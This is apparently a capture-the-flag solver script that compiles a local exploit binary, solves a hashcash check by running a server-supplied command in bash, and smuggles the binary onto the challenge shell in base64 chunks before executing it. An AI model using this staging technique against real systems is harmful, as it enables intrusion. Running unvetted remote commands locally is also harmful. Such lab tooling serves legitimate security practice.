import os
from ptrlib import *
import base64

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "10003")

def run_cmd(cmd):
    sock.sendlineafter("$ ", cmd)

if os.system("musl-gcc -static solve.c") != 0:
    exit(1)
os.system("strip --strip-all a.out")

with open("a.out", "rb") as f:
    buf = f.read()

sock = Socket(HOST, int(PORT))
p = Process(["bash", "-c", sock.recvline().decode()])
sock.sendline(p.recvlineafter("hashcash token: "))
p.close()

run_cmd("cd /playground")
data = base64.b64encode(buf)
s = 0
for block in chunks(data, 0x300):
    logger.info(f"{s} / {len(data)}")
    run_cmd("echo '" + block.decode() + "' >> b64pwn")
    s += 0x300

run_cmd("cat b64pwn | base64 -d > pwn")
run_cmd("chmod +x pwn")

sock.interactive()
